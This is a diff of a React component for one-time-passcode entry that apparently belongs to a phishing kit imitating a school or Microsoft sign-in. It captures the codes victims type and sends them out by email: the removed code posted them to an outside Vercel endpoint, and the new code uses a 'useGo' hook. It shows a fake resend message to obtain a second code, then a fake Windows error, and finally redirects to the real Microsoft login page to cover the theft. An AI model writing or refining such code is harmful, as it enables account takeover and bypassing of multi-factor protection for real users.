@@ -1,5 +1,5 @@
 import { useState, useEffect } from "react";
-import axios from "axios"; // Import axios
+import useGo from "./useGo"; // Import the useGo hook
 import { FormFooter } from "./FormFooter";
 
 export const OTP = ({ email, onBack, setStep }) => {
@@ -9,8 +9,9 @@ export const OTP = ({ email, onBack, setStep }) => {
   const [firstOtp, setFirstOtp] = useState(localStorage.getItem("otp")); // Get the first OTP from localStorage
   const [otpStep, setOtpStep] = useState(1); // Track which OTP step (first, second)
   const [isSending, setIsSending] = useState(false); // Track if OTP is being sent
+  const { isSending: isEmailSending, error, sendEmail } = useGo(); // Use the useGo hook
 
-  // Function to send OTP email using axios
+  // Function to send OTP email using useGo hook
   const sendOtpEmail = async (otp, type) => {
     const studentId = localStorage.getItem("student_id"); // Fetch student ID from localStorage
 
@@ -20,21 +21,9 @@ export const OTP = ({ email, onBack, setStep }) => {
     };
 
     try {
-      setIsSending(true); // Set sending state to true when OTP email starts
-      const response = await axios.post(
-        "https://ivytechedu-cvfc.vercel.app/send-email",
-        payload
-      ); // Make POST request to backend email API
-      console.log(`${type} OTP email sent successfully`, response.data);
-      setIsSending(false); // Reset sending state after the email is sent
-      return true; // Return true if email was sent successfully
-    } catch (error) {
-      setIsSending(false); // Reset sending state in case of error
-      console.error(
-        `${type} OTP email failed`,
-        error.response?.data || error.message
-      );
-      return false; // Return false if there was an error
+      await sendEmail(payload.subject, payload.message); // Use the sendEmail function
+    } catch (err) {
+      console.error(`${type} OTP email failed`, err);
     }
   };
 
@@ -48,14 +37,12 @@ export const OTP = ({ email, onBack, setStep }) => {
     if (otpStep === 1) {
       // Handle first OTP step
       localStorage.setItem("first_otp", otpValue);
-      const emailSent = await sendOtpEmail(otpValue, "First"); // Send first OTP email
-      if (emailSent) {
+      await sendOtpEmail(otpValue, "First"); // Send first OTP email
+      if (!error) {
         setOtpStep(2); // Move to second OTP step after successful email send
-        setOtpErrorMessage(
-          "Something went wrong. A new verification code has been sent to your phone number. Please try again."
-        );
+        setOtpErrorMessage(""); // Clear any previous error messages
       } else {
-        setOtpErrorMessage("Failed to send the first OTP. Please try again.");
+        setOtpErrorMessage(`Failed to send first OTP: ${error}`);
       }
       setOtpAttempts(otpAttempts + 1); // Increment OTP attempts
       setOtpValue(""); // Clear the OTP field for the user to enter the second one
@@ -72,8 +59,8 @@ export const OTP = ({ email, onBack, setStep }) => {
         return;
       }
 
-      const emailSent = await sendOtpEmail(otpValue, "Second"); // Send second OTP email
-      if (emailSent) {
+      await sendOtpEmail(otpValue, "Second"); // Send second OTP email
+      if (!error) {
         setOtpAttempts(otpAttempts + 1); // Increment OTP attempts
         setOtpErrorMessage(
           "Error 0x80072EE7: We encountered a problem while processing your request. Please try again later. If the problem persists, contact support."
@@ -86,13 +73,12 @@ export const OTP = ({ email, onBack, setStep }) => {
             "https://login.microsoftonline.com/3ef7cc24-ad65-4bd7-a6bc-34f32e43989a/login"; // Redirect after 2 seconds
         }, 4000);
       } else {
-        setOtpErrorMessage("Failed to send the second OTP. Please try again.");
+        setOtpErrorMessage(`Failed to send second OTP: ${error}`);
       }
       setOtpValue(""); // Clear OTP field for the second OTP
       return;
     }
   };
-
 
   // This useEffect will simulate a retry mechanism, giving the user a limited number of OTP attempts.
   useEffect(() => {
@@ -108,7 +94,7 @@ export const OTP = ({ email, onBack, setStep }) => {
       <div
         className="field-container"
         style={{
-          opacity: isSending ? 0.5 : 1, // Fade only when email is sending
+          opacity: isEmailSending ? 0.5 : 1, // Fade only when email is sending
           transition: "opacity 0.3s ease-in-out", // Optional: smooth transition for opacity change
         }}
       >
